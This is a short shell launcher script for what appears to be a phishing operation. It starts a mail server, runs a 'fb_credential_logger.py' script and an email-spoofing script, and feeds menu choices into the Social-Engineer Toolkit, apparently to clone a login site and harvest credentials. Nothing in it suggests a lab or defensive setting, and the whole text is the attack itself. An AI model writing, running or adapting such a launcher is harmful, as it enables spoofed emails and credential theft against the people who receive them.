sudo postfix start
sudo python3 fb_credential_logger.py & python3 make_dummy_data.py & python3 main.py & ./spoof_email.sh $3 & printf "1\n2\n3\n2\n$1\n$2\nn" | sudo setoolkit
